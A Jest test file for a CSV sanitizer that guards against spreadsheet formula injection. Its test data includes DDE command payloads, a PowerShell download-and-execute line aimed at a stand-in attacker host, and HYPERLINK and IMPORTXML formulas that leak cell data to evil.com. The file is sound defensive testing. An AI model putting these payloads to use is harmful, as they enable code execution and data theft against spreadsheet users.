const {
  sanitizeCsvValue,
  sanitizeCsvRow,
  sanitizeCsvRows,
} = require("../../src/utils/csv-sanitizer");

describe("CSV sanitizer utility", () => {
  describe("sanitizeCsvValue", () => {
    describe("null and undefined handling", () => {
      test("should return empty string for null", () => {
        expect(sanitizeCsvValue(null)).toBe("");
      });

      test("should return empty string for undefined", () => {
        expect(sanitizeCsvValue(undefined)).toBe("");
      });
    });

    describe("safe values", () => {
      test("should return empty string unchanged", () => {
        expect(sanitizeCsvValue("")).toBe("");
      });

      test("should return normal text unchanged", () => {
        expect(sanitizeCsvValue("Hello World")).toBe("Hello World");
      });

      test("should return numbers unchanged", () => {
        expect(sanitizeCsvValue(12345)).toBe("12345");
        expect(sanitizeCsvValue(3.14159)).toBe("3.14159");
      });

      test("should return text starting with letters unchanged", () => {
        expect(sanitizeCsvValue("John Doe")).toBe("John Doe");
      });

      test("should allow formulas mid-string", () => {
        expect(sanitizeCsvValue("Total = 100")).toBe("Total = 100");
        expect(sanitizeCsvValue("Score: +5")).toBe("Score: +5");
      });
    });

    describe("Excel formula injection prevention", () => {
      test("should sanitize values starting with =", () => {
        expect(sanitizeCsvValue("=SUM(A1:A10)")).toBe("'=SUM(A1:A10)");
        expect(sanitizeCsvValue("=1+1")).toBe("'=1+1");
        expect(sanitizeCsvValue("=CMD|' /C calc'!A0")).toBe("'=CMD|' /C calc'!A0");
      });

      test("should sanitize values starting with +", () => {
        expect(sanitizeCsvValue("+1234567890")).toBe("'+1234567890");
        expect(sanitizeCsvValue("+cmd|' /C notepad'!A0")).toBe("'+cmd|' /C notepad'!A0");
      });

      test("should sanitize values starting with -", () => {
        expect(sanitizeCsvValue("-100")).toBe("'-100");
        expect(sanitizeCsvValue("-2+3+cmd|' /C calc'!A0")).toBe("'-2+3+cmd|' /C calc'!A0");
      });

      test("should sanitize values starting with @", () => {
        expect(sanitizeCsvValue("@SUM(A1:A10)")).toBe("'@SUM(A1:A10)");
      });
    });

    describe("other injection vectors", () => {
      test("should sanitize values starting with |", () => {
        expect(sanitizeCsvValue("|calc")).toBe("'|calc");
      });

      test("should sanitize values starting with %", () => {
        expect(sanitizeCsvValue("%COMSPEC%")).toBe("'%COMSPEC%");
      });

      test("should sanitize values starting with tab", () => {
        expect(sanitizeCsvValue("\t=SUM(A1)")).toBe("'\t=SUM(A1)");
      });
    });

    describe("whitespace handling", () => {
      test("should sanitize formulas with leading whitespace", () => {
        expect(sanitizeCsvValue("  =SUM(A1)")).toBe("'  =SUM(A1)");
        expect(sanitizeCsvValue("   +1234")).toBe("'   +1234");
      });

      test("should preserve original string when prepending quote", () => {
        const input = "   =FORMULA";
        const result = sanitizeCsvValue(input);
        expect(result).toBe("'   =FORMULA");
        expect(result.slice(1)).toBe(input);
      });
    });

    describe("edge cases", () => {
      test("should handle boolean values", () => {
        expect(sanitizeCsvValue(true)).toBe("true");
        expect(sanitizeCsvValue(false)).toBe("false");
      });

      test("should handle objects by converting to string", () => {
        expect(sanitizeCsvValue({ key: "value" })).toBe("[object Object]");
      });

      test("should handle arrays by converting to string", () => {
        expect(sanitizeCsvValue([1, 2, 3])).toBe("1,2,3");
      });

      test("should handle zero", () => {
        expect(sanitizeCsvValue(0)).toBe("0");
      });

      test("should handle negative zero", () => {
        expect(sanitizeCsvValue(-0)).toBe("0");
      });
    });
  });

  describe("sanitizeCsvRow", () => {
    test("should return empty object for null input", () => {
      expect(sanitizeCsvRow(null)).toEqual({});
    });

    test("should return empty object for undefined input", () => {
      expect(sanitizeCsvRow(undefined)).toEqual({});
    });

    test("should return empty object for non-object input", () => {
      expect(sanitizeCsvRow("string")).toEqual({});
      expect(sanitizeCsvRow(123)).toEqual({});
      expect(sanitizeCsvRow(true)).toEqual({});
    });

    test("should handle empty object", () => {
      expect(sanitizeCsvRow({})).toEqual({});
    });

    test("should sanitize all values in a row", () => {
      const input = {
        name: "John",
        formula: "=SUM(A1:A10)",
        phone: "+1234567890",
        score: "-100",
      };

      const expected = {
        name: "John",
        formula: "'=SUM(A1:A10)",
        phone: "'+1234567890",
        score: "'-100",
      };

      expect(sanitizeCsvRow(input)).toEqual(expected);
    });

    test("should handle mixed value types", () => {
      const input = {
        number: 42,
        nullVal: null,
        undefinedVal: undefined,
        text: "Hello",
        dangerous: "=CMD",
      };

      const expected = {
        number: "42",
        nullVal: "",
        undefinedVal: "",
        text: "Hello",
        dangerous: "'=CMD",
      };

      expect(sanitizeCsvRow(input)).toEqual(expected);
    });

    test("should preserve key names", () => {
      const input = {
        "user-name": "John",
        "email@domain": "test@example.com",
        "space key": "value",
      };

      const result = sanitizeCsvRow(input);
      expect(Object.keys(result)).toEqual(["user-name", "email@domain", "space key"]);
    });
  });

  describe("sanitizeCsvRows", () => {
    test("should return empty array for null input", () => {
      expect(sanitizeCsvRows(null)).toEqual([]);
    });

    test("should return empty array for undefined input", () => {
      expect(sanitizeCsvRows(undefined)).toEqual([]);
    });

    test("should return empty array for non-array input", () => {
      expect(sanitizeCsvRows("string")).toEqual([]);
      expect(sanitizeCsvRows({})).toEqual([]);
      expect(sanitizeCsvRows(123)).toEqual([]);
    });

    test("should handle empty array", () => {
      expect(sanitizeCsvRows([])).toEqual([]);
    });

    test("should sanitize all rows in array", () => {
      const input = [
        { name: "Alice", value: "=100" },
        { name: "Bob", value: "+200" },
        { name: "Charlie", value: "300" },
      ];

      const expected = [
        { name: "Alice", value: "'=100" },
        { name: "Bob", value: "'+200" },
        { name: "Charlie", value: "300" },
      ];

      expect(sanitizeCsvRows(input)).toEqual(expected);
    });

    test("should handle rows with different structures", () => {
      const input = [
        { a: "1", b: "2" },
        { a: "=3", c: "4" },
        { d: "+5" },
      ];

      const expected = [
        { a: "1", b: "2" },
        { a: "'=3", c: "4" },
        { d: "'+5" },
      ];

      expect(sanitizeCsvRows(input)).toEqual(expected);
    });

    test("should handle null and undefined rows gracefully", () => {
      const input = [
        { name: "Valid" },
        null,
        undefined,
        { name: "=Invalid" },
      ];

      const expected = [
        { name: "Valid" },
        {},
        {},
        { name: "'=Invalid" },
      ];

      expect(sanitizeCsvRows(input)).toEqual(expected);
    });

    test("should not mutate original array", () => {
      const input = [{ value: "=FORMULA" }];
      const original = JSON.parse(JSON.stringify(input));

      sanitizeCsvRows(input);

      expect(input).toEqual(original);
    });
  });

  describe("real-world attack patterns", () => {
    test("should prevent DDE attack", () => {
      // DDE (Dynamic Data Exchange) attack pattern
      const ddeAttack = "=cmd|'/C calc'!A0";
      expect(sanitizeCsvValue(ddeAttack)).toBe("'=cmd|'/C calc'!A0");
    });

    test("should prevent PowerShell execution", () => {
      const psAttack = "=cmd|'/C powershell IEX(wget attacker/evil.ps1)'!A0";
      expect(sanitizeCsvValue(psAttack)).toBe("'=cmd|'/C powershell IEX(wget attacker/evil.ps1)'!A0");
    });

    test("should prevent hyperlink injection", () => {
      const hyperlinkAttack = '=HYPERLINK("http://evil.com/?data="&A1,"Click")';
      expect(sanitizeCsvValue(hyperlinkAttack)).toBe(`'=HYPERLINK("http://evil.com/?data="&A1,"Click")`);
    });

    test("should prevent IMPORTXML injection", () => {
      const importAttack = '=IMPORTXML("http://evil.com/?data="&A1,"//x")';
      expect(sanitizeCsvValue(importAttack)).toBe(`'=IMPORTXML("http://evil.com/?data="&A1,"//x")`);
    });
  });
});
